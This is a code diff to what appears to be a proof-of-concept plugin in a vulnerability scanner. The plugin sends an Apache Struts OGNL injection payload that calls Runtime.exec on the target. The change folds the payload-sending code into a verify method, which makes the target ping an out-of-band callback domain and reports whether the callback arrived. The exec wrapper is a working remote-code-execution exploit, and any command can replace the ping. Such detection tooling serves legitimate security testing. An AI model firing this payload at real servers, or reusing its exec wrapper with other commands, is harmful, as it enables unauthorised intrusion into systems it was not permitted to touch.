@@ -3,7 +3,7 @@
 '''
 Date: 2022-03-22 10:33:13
 LastEditors: recar
-LastEditTime: 2022-03-22 18:48:06
+LastEditTime: 2022-03-23 18:14:57
 '''
 
 from plugins.poc.base import PocBase
@@ -25,16 +25,14 @@ class Poc(PocBase):
             }
         self.post(self.base_url, data=data, timeout=3)
 
-    def send_payload(self):
+    def verify(self):
         self.reverse = Reverse()
         cmd = "ping -c 10 {0}".format(self.reverse.domain)
         data = {
             "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('"+cmd+"'))}"
         }
-        return self.post(self.base_url, data=data,timeout=3)
-
-    def verify(self, response):
+        self.post(self.base_url, data=data,timeout=3)        
         if self.reverse.verify():
-            return True
-        return False
+            return True, data
+        return False, None
 
